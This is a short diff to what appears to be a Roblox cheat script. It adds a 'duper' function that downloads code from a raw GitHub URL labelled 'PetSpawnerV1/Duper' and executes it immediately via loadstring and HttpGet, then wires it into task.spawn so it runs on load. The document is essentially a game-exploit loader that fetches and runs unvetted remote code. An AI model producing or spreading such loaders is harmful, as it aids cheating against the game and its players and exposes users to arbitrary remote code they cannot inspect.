@@ -1,3 +1,4 @@
+local function duper()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/RbxScript-design/PetSpawnerV1/refs/heads/main/Duper"))()
 end
 local function loadui()
@@ -5,5 +6,5 @@ local function loadui()
 
 end
 
-task.spawn(1)
-task.spawn(2)
+task.spawn(duper)
+task.spawn(loadui)
